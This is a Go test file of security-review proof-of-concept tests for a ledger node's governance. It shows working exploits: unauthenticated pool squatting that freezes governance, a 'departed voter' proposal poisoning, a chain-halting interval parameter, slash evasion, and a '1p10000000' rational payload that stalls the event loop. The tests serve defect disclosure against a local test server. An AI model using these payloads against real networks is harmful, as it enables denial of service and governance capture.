package node

// Governance-area review PoCs (2026-10-27). Each test asserts the SECURE behaviour, so a FAIL
// demonstrates the defect; t.Logf prints the concrete bad outcome. Run with GOLEDGER_CHAOS_SLACK=4.

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/big"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/eval-apply-labs/go-ledger/consensus"
	"github.com/eval-apply-labs/go-ledger/ledger"
	"github.com/eval-apply-labs/go-ledger/signing"
)

type govNopTransport struct{}

func (govNopTransport) Broadcast(string, Message) {}

func govPost(t *testing.T, url string, body any) int {
	t.Helper()
	b, _ := json.Marshal(body)
	resp, err := http.Post(url, "application/json", bytes.NewReader(b))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	return resp.StatusCode
}

// FINDING: the governance vote pools allocate a slot BEFORE any vote is verified, so an
// unauthenticated client can fill both 64-slot pools with VOTELESS entries over the open HTTP API.
// Entries that bind the current sequence / current parameter digest / an account's current balance
// (0 for any unknown key) are never pruned, and the sequence can only advance through a pooled
// certificate — so once full, no new proposal can ever be pooled and governance is frozen for good
// (no key, 128 POSTs per node; GET /hdls/governance hands the attacker the values to bind to).
func TestPoCGovPoolSquatFreezesGovernance(t *testing.T) {
	alice, _ := signing.Generate(signing.Ed25519{}, "testnet")
	aliceKey := alice.PublicKeyBase64()
	vs := consensus.NewValidatorSet([]consensus.Validator{{PublicKey: aliceKey, Power: 1}}) // quorum 1
	coop := "community-coop-account"
	nd := New(Config{
		NetworkID: "testnet", Scheme: signing.Ed25519{}, Signer: alice, Validators: vs,
		TransactionCost: rat("0.1"), Timeout: 5 * time.Second, MinBlockInterval: 30 * time.Millisecond,
		Genesis: []ledger.Account{
			{PublicKey: aliceKey, Name: "founder", Amount: rat("1000"), ValidatorNode: aliceKey},
			{PublicKey: coop, Name: "coop", Amount: rat("10")},
		},
	}, NewHTTPTransport(nil))
	srv := httptest.NewServer(NewServer(nd).Handler())
	defer srv.Close()
	nd.Start()
	defer nd.Stop()
	waitFor(t, 2*time.Second, func() bool { return nd.Snapshot().Height >= 2 }, "network did not start")

	// --- the attacker: no key, just the public governance view and the open vote endpoints ---
	view := nd.GovernanceView()
	snap := nd.Snapshot()
	cur := snap.Parameters
	for i := 0; i < 64; i++ {
		junk := cur
		junk.TransactionCost = big.NewRat(int64(1000+i), 1000) // any Acceptable profile, all distinct
		govPost(t, srv.URL+"/hdls/parameter-vote", ledger.ParameterChange{NewParameters: junk, PreviousParametersDigest: cur.Digest(), Sequence: view.GovernanceSequence})
		govPost(t, srv.URL+"/hdls/reassignment-vote", ledger.Reassignment{Account: fmt.Sprintf("nobody-%d", i), PreviousAmount: new(big.Rat), NewAmount: big.NewRat(int64(i+1), 1), Sequence: view.GovernanceSequence})
	}
	waitFor(t, 2*time.Second, func() bool {
		v := nd.GovernanceView()
		return len(v.ParameterProposals) == 64 && len(v.Reassignments) == 64
	}, "setup: junk did not fill the pools")
	t.Logf("attacker filled pools: %d parameter + %d reassignment proposals, all with 0 votes", 64, 64)

	// --- the legitimate validator now votes (quorum 1: her single vote ratifies) ---
	seq := nd.Snapshot().GovernanceSequence
	raised := cur
	raised.TransactionCost = rat("0.5")
	pv, _ := ledger.SignParameterVote(alice, raised, cur.Digest(), seq)
	nd.SubmitParameterVote(ledger.ParameterChange{NewParameters: raised, PreviousParametersDigest: cur.Digest(), Sequence: seq, Votes: []ledger.ParameterVote{pv}})
	rv, _ := ledger.SignReassignmentVote(alice, coop, rat("10"), rat("500"), seq)
	nd.SubmitReassignmentVote(ledger.Reassignment{Account: coop, PreviousAmount: rat("10"), NewAmount: rat("500"), Sequence: seq, Votes: []ledger.ReassignmentVote{rv}})

	start := nd.Snapshot().Height
	waitFor(t, 4*time.Second, func() bool { return nd.Snapshot().Height >= start+15 }, "chain stopped")
	after := nd.Snapshot()
	v := nd.GovernanceView()
	t.Logf("after %d more blocks: cost=%s coop=%s sequence=%d pools still %d/%d (junk survives every prune)",
		after.Height-start, after.Parameters.TransactionCost.RatString(), balance(after.Accounts, coop).RatString(),
		after.GovernanceSequence, len(v.ParameterProposals), len(v.Reassignments))
	if after.Parameters.TransactionCost.Cmp(rat("0.5")) != 0 || balance(after.Accounts, coop).Cmp(rat("500")) != 0 {
		t.Errorf("GOVERNANCE FROZEN: fully-ratified (quorum-1) parameter change and reassignment never enacted; voteless junk squats all 128 pool slots")
	}
}

// FINDING (dynamic validators): Valid() rejects the WHOLE certificate if any vote is from a key that
// is not in the current set, and the node never removes a pooled vote. So a voter that leaves the set
// after voting (re-delegates, drops below threshold, or is slashed) permanently poisons that pooled
// proposal: the remaining voters hold a clear quorum, the admin view shows "ready ✓", re-submitting
// their votes is a no-op, and pendingParameterChange never returns it. A single small validator can
// veto any proposal it voted on by moving its stake once.
func TestPoCGovDepartedVoterPoisonsPooledProposal(t *testing.T) {
	scheme, network := signing.Ed25519{}, "testnet"
	mk := func() *signing.Signer { s, _ := signing.Generate(scheme, network); return s }
	v1, v2, v3 := mk(), mk(), mk()
	k1, k2, k3 := v1.PublicKeyBase64(), v2.PublicKeyBase64(), v3.PublicKeyBase64()
	threshold := rat("10")
	genesis := []ledger.Account{
		{PublicKey: k1, Amount: rat("60"), ValidatorNode: k1},
		{PublicKey: k2, Amount: rat("30"), ValidatorNode: k2},
		{PublicKey: k3, Amount: rat("15"), ValidatorNode: k3},
	}
	nd := New(Config{NetworkID: network, Scheme: scheme, Signer: v1, ValidatorThreshold: threshold,
		TransactionCost: rat("0.1"), Timeout: 3 * time.Second, Genesis: genesis}, govNopTransport{})

	cur := nd.parameters
	proposed := cur
	proposed.TransactionCost = rat("0.5")
	vote := func(s *signing.Signer) ledger.ParameterChange {
		pv, _ := ledger.SignParameterVote(s, proposed, cur.Digest(), nd.governanceSequence)
		return ledger.ParameterChange{NewParameters: proposed, PreviousParametersDigest: cur.Digest(), Sequence: nd.governanceSequence, Votes: []ledger.ParameterVote{pv}}
	}
	// v3 (smallest validator, 15 of 105) votes first.
	if !nd.addParameterVotes(vote(v3)) {
		t.Fatal("setup: v3's vote should pool")
	}
	// v3 then re-delegates its stake to v1 (one signed account update) — it leaves the set. Apply the
	// block exactly as node.commit does, then run the commit-time prune.
	upd, _ := ledger.SignAccountUpdate(v3, ledger.AccountUpdate{From: k3, Delegated: k1, BlockID: 1})
	prevState := ledger.LedgerState{Accounts: nd.accounts, Parameters: nd.parameters, GovernanceSequence: nd.governanceSequence}
	blk := ledger.ProposeBlock(scheme, network, 1, prevState, ledger.BlockContent{Updates: []ledger.AccountUpdate{upd}}, nd.validatorsFor(nd.accounts))
	next, ok := ledger.ApplyBlock(scheme, network, prevState, blk, nd.validatorsFor(nd.accounts))
	if !ok {
		t.Fatal("setup: update block should apply")
	}
	nd.accounts, nd.parameters, nd.governanceSequence = next.Accounts, next.Parameters, next.GovernanceSequence
	nd.height = 2
	nd.pruneParameterProposals()
	set := nd.validatorsFor(nd.accounts)
	t.Logf("after v3 re-delegates: set=%d validators, total=%d quorum=%d, v3 in set=%v", len(set.Validators()), set.TotalPower(), set.Quorum(), set.Contains(k3))

	// v1 + v2 (now 105 of 105 power) vote — far above quorum.
	nd.addParameterVotes(vote(v1))
	nd.addParameterVotes(vote(v2))
	nd.addParameterVotes(vote(v1)) // re-submission is a no-op
	view := nd.governanceView()
	fresh := ledger.ParameterChange{NewParameters: proposed, PreviousParametersDigest: cur.Digest(), Sequence: nd.governanceSequence,
		Votes: append(vote(v1).Votes, vote(v2).Votes...)}
	t.Logf("admin view: votedPower=%d quorum=%d reached=%v amendsCurrent=%v ; pendingParameterChange()=%v ; same proposal with only v1+v2 votes Valid=%v",
		view.ParameterProposals[0].VotedPower, view.Quorum, view.ParameterProposals[0].Reached, view.ParameterProposals[0].AmendsCurrent,
		nd.pendingParameterChange() != nil, fresh.Valid(scheme, network, set, nd.parameters, nd.governanceSequence))
	if nd.pendingParameterChange() == nil {
		t.Errorf("POISONED: a proposal with a clear quorum of CURRENT validators can never be proposed because a departed voter's signature is stuck in the pool")
	}
}

// FINDING: a ratified BlockIntervalMs of centuries halts the chain for good. After the enacting block
// node.commit schedules evNextHeight `interval` later; no block → no governance → no on-chain revert.
func TestPoCGovHugeBlockIntervalHaltsChain(t *testing.T) {
	alice, _ := signing.Generate(signing.Ed25519{}, "testnet")
	aliceKey := alice.PublicKeyBase64()
	vs := consensus.NewValidatorSet([]consensus.Validator{{PublicKey: aliceKey, Power: 1}})
	nd := New(Config{
		NetworkID: "testnet", Scheme: signing.Ed25519{}, Signer: alice, Validators: vs,
		TransactionCost: rat("0.1"), Timeout: 5 * time.Second, MinBlockInterval: 30 * time.Millisecond,
		Genesis: []ledger.Account{{PublicKey: aliceKey, Name: "founder", Amount: rat("1000"), ValidatorNode: aliceKey}},
	}, NewHTTPTransport(nil))
	nd.Start()
	defer nd.Stop()
	waitFor(t, 2*time.Second, func() bool { return nd.Snapshot().Height >= 2 }, "network did not start")

	snap := nd.Snapshot()
	cur := snap.Parameters
	halt := cur
	halt.BlockIntervalMs = 86_400_000_000 // "one day" with three extra zeros: ~2.7 years
	pv, _ := ledger.SignParameterVote(alice, halt, cur.Digest(), snap.GovernanceSequence)
	nd.SubmitParameterVote(ledger.ParameterChange{NewParameters: halt, PreviousParametersDigest: cur.Digest(), Sequence: snap.GovernanceSequence, Votes: []ledger.ParameterVote{pv}})
	waitFor(t, 4*time.Second, func() bool { return nd.Snapshot().Parameters.BlockIntervalMs == halt.BlockIntervalMs }, "setup: change not enacted")

	// Immediately vote the revert (the validator noticed the typo).
	s2 := nd.Snapshot()
	revert, _ := ledger.SignParameterVote(alice, cur, halt.Digest(), s2.GovernanceSequence)
	nd.SubmitParameterVote(ledger.ParameterChange{NewParameters: cur, PreviousParametersDigest: halt.Digest(), Sequence: s2.GovernanceSequence, Votes: []ledger.ParameterVote{revert}})
	time.Sleep(3 * time.Second * testTimeSlack)
	s3 := nd.Snapshot()
	t.Logf("enacted at height %d; 3s later height=%d, BlockIntervalMs=%d (revert pooled but never carried — no further block)", s2.Height, s3.Height, s3.Parameters.BlockIntervalMs)
	if s3.Height == s2.Height {
		t.Errorf("CHAIN HALTED: a ratified timing profile stopped block production and the revert can never enact")
	}
}

// FINDING (dynamic validators): slashing deletes only the offender's OWN account. Stake delegated to
// the offender by other accounts still derives its power, so a burned "bank" key stays in the set
// (docs/consensus.md: "ejecting them from a dynamic set"). And a self-staked offender that WAS ejected
// can come straight back: any payment re-creates its account with ValidatorNode = itself, and the
// node already pruned the evidence once the key left the set (node.commit), so nobody re-slashes it.
func TestPoCGovSlashDoesNotBurnDynamicValidatorKey(t *testing.T) {
	scheme, network := signing.Ed25519{}, "testnet"
	mk := func() *signing.Signer { s, _ := signing.Generate(scheme, network); return s }
	bank, honest, d1, d2, payer := mk(), mk(), mk(), mk(), mk()
	B, H := bank.PublicKeyBase64(), honest.PublicKeyBase64()
	threshold := rat("10")
	accounts := []ledger.Account{
		{PublicKey: B, Amount: rat("1"), ValidatorNode: B},                      // the bank's own (tiny) account
		{PublicKey: d1.PublicKeyBase64(), Amount: rat("100"), ValidatorNode: B}, // depositors delegate to the bank
		{PublicKey: d2.PublicKeyBase64(), Amount: rat("100"), ValidatorNode: B},
		{PublicKey: H, Amount: rat("150"), ValidatorNode: H},
		{PublicKey: payer.PublicKeyBase64(), Amount: rat("50"), ValidatorNode: H},
	}
	var dX, dY [32]byte
	dX[0], dY[0] = 1, 2
	vX, _ := consensus.SignVote(bank, consensus.Vote{Height: 1, Round: 0, Type: consensus.Precommit, BlockDigest: dX, Validator: B})
	vY, _ := consensus.SignVote(bank, consensus.Vote{Height: 1, Round: 0, Type: consensus.Precommit, BlockDigest: dY, Validator: B})
	ev := consensus.Evidence{Validator: B, A: vX, B: vY}
	state := ledger.LedgerState{Accounts: accounts, Parameters: ledger.LedgerParameters{TransactionCost: rat("0.1")}}
	before := deriveValidators(accounts, threshold)
	blk := ledger.ProposeBlock(scheme, network, 2, state, ledger.BlockContent{Evidence: []consensus.Evidence{ev}}, before)
	next, ok := ledger.ApplyBlock(scheme, network, state, blk, before)
	if !ok {
		t.Fatal("setup: slash block should apply")
	}
	after := deriveValidators(next.Accounts, threshold)
	t.Logf("delegated bank: power before slash=%d after=%d (of total %d, quorum %d) — still a validator=%v",
		before.Power(B), after.Power(B), after.TotalPower(), after.Quorum(), after.Contains(B))
	if after.Contains(B) {
		t.Errorf("BURNED KEY STILL VALIDATING: the equivocating bank keeps %d voting power from delegated stake after its slash", after.Power(B))
	}

	// Self-staked case: the honest validator's peer H2 equivocates, is ejected, then is simply paid back in.
	h2 := mk()
	K := h2.PublicKeyBase64()
	acc2 := []ledger.Account{{PublicKey: K, Amount: rat("100"), ValidatorNode: K}, {PublicKey: H, Amount: rat("150"), ValidatorNode: H}, {PublicKey: payer.PublicKeyBase64(), Amount: rat("50"), ValidatorNode: H}}
	wX, _ := consensus.SignVote(h2, consensus.Vote{Height: 1, Round: 0, Type: consensus.Prevote, BlockDigest: dX, Validator: K})
	wY, _ := consensus.SignVote(h2, consensus.Vote{Height: 1, Round: 0, Type: consensus.Prevote, BlockDigest: dY, Validator: K})
	ev2 := consensus.Evidence{Validator: K, A: wX, B: wY}
	st2 := ledger.LedgerState{Accounts: acc2, Parameters: ledger.LedgerParameters{TransactionCost: rat("0.1")}}
	b2 := ledger.ProposeBlock(scheme, network, 2, st2, ledger.BlockContent{Evidence: []consensus.Evidence{ev2}}, deriveValidators(acc2, threshold))
	s2, _ := ledger.ApplyBlock(scheme, network, st2, b2, deriveValidators(acc2, threshold))
	ejected := !deriveValidators(s2.Accounts, threshold).Contains(K)
	pay, _ := ledger.SignPayment(payer, ledger.Payment{PublicKeyFrom: payer.PublicKeyBase64(), PublicKeyTo: K, Amount: rat("20"), BlockID: 3})
	b3 := ledger.ProposeBlock(scheme, network, 3, s2, ledger.BlockContent{Payments: []ledger.Payment{pay}}, deriveValidators(s2.Accounts, threshold))
	s3, _ := ledger.ApplyBlock(scheme, network, s2, b3, deriveValidators(s2.Accounts, threshold))
	back := deriveValidators(s3.Accounts, threshold)
	t.Logf("self-staked offender: ejected by slash=%v; one payment later back in the set=%v with power %d", ejected, back.Contains(K), back.Power(K))
	if back.Contains(K) {
		t.Errorf("BURNED KEY RE-ADMITTED: a single incoming payment puts the slashed key back in the validator set")
	}
}

// FINDING: unauthenticated governance-vote JSON reaches big.Rat → decimal conversion ON THE EVENT
// LOOP before any signature check. big.Rat accepts exponent notation, so the 12-byte JSON string
// "1p10000000" decodes in ~2 ms to a 10-Mbit integer whose RatString() takes ~1.8 s. That string is
// built (a) once per intake for the pool key, (b) once PER CARRIED VOTE in addParameterVotes /
// addReassignmentVotes (the preimage is an argument evaluated before VerifyBase64 can reject a bogus
// signature, and alreadyVoted only dedups POOLED voters, so one message can repeat a public validator
// key ~13,000 times inside 1 MiB), and (c) on EVERY startHeight for every pooled entry that binds the
// current sequence (Valid builds the preimage before counting votes) — entries that are never pruned.
func TestPoCGovHugeRationalStallsEventLoop(t *testing.T) {
	alice, _ := signing.Generate(signing.Ed25519{}, "testnet")
	aliceKey := alice.PublicKeyBase64()
	vs := consensus.NewValidatorSet([]consensus.Validator{{PublicKey: aliceKey, Power: 1}})
	nd := New(Config{
		NetworkID: "testnet", Scheme: signing.Ed25519{}, Signer: alice, Validators: vs,
		TransactionCost: rat("0.1"), Timeout: 5 * time.Second, MinBlockInterval: 30 * time.Millisecond,
		Genesis: []ledger.Account{{PublicKey: aliceKey, Name: "founder", Amount: rat("1000"), ValidatorNode: aliceKey}},
	}, NewHTTPTransport(nil))
	srv := httptest.NewServer(NewServer(nd).Handler())
	defer srv.Close()
	nd.Start()
	defer nd.Stop()
	waitFor(t, 2*time.Second, func() bool { return nd.Snapshot().Height >= 3 }, "network did not start")

	h0 := nd.Snapshot().Height
	time.Sleep(2 * time.Second)
	baseline := nd.Snapshot().Height - h0

	// The attacker reads the public governance view to bind the current sequence/digest, then posts
	// raw JSON (amounts travel as strings; "1p10000000" == 2^10000000).
	resp, err := http.Get(srv.URL + "/hdls/governance")
	if err != nil {
		t.Fatal(err)
	}
	var gv GovernanceView
	_ = json.NewDecoder(resp.Body).Decode(&gv)
	resp.Body.Close()
	cur := ledger.LedgerParameters{TransactionCost: rat(gv.TransactionCost), BlockIntervalMs: gv.BlockIntervalMs, StepTimeoutMs: gv.StepTimeoutMs, MaxPeers: gv.MaxPeers, MaxMessageBytes: gv.MaxMessageBytes}
	d := cur.Digest()
	digestJSON, _ := json.Marshal(d)
	post := func(raw string) {
		r, err := http.Post(srv.URL+"/hdls/parameter-vote", "application/json", bytes.NewReader([]byte(raw)))
		if err != nil {
			t.Fatal(err)
		}
		r.Body.Close()
	}

	// (b) ONE message carrying 3 bogus votes "from" the (public) validator key.
	votes := fmt.Sprintf(`{"Validator":%q,"Signature":""}`, aliceKey)
	msg := fmt.Sprintf(`{"NewParameters":{"TransactionCost":"1p10000000","BlockIntervalMs":%d,"StepTimeoutMs":%d,"MaxPeers":%d,"MaxMessageBytes":%d},"PreviousParametersDigest":%s,"Sequence":%d,"Votes":[%s,%s,%s]}`,
		gv.BlockIntervalMs, gv.StepTimeoutMs, gv.MaxPeers, gv.MaxMessageBytes, digestJSON, gv.GovernanceSequence, votes, votes, votes)
	post(msg)
	time.Sleep(50 * time.Millisecond)
	t0 := time.Now()
	nd.Snapshot() // queued behind the vote on the event loop
	stall := time.Since(t0)
	perVote := stall / 4 // pool key + 3 votes
	t.Logf("one %d-byte POST stalled the event loop %v (~%v per carried vote; a 1 MiB body holds ~%d such votes → ~%.1f hours)",
		len(msg), stall.Round(time.Millisecond), perVote.Round(time.Millisecond), (1<<20)/len(votes), (time.Duration((1<<20)/len(votes)) * perVote).Hours())

	// (c) persistent: that entry is now POOLED (binds the current sequence/digest, never pruned), and
	// every startHeight re-stringifies it in pendingParameterChange → Valid.
	h1 := nd.Snapshot().Height
	time.Sleep(2 * time.Second)
	after := nd.Snapshot().Height - h1
	t.Logf("blocks per 2s: before=%d, after one pooled huge-rational entry=%d (pool entries=%d)", baseline, after, len(nd.GovernanceView().ParameterProposals))
	if stall > time.Second || after*4 < baseline {
		t.Errorf("EVENT LOOP DoS: unauthenticated %d-byte governance vote → %v loop stall, block rate %d → %d per 2s", len(msg), stall.Round(time.Millisecond), baseline, after)
	}
}
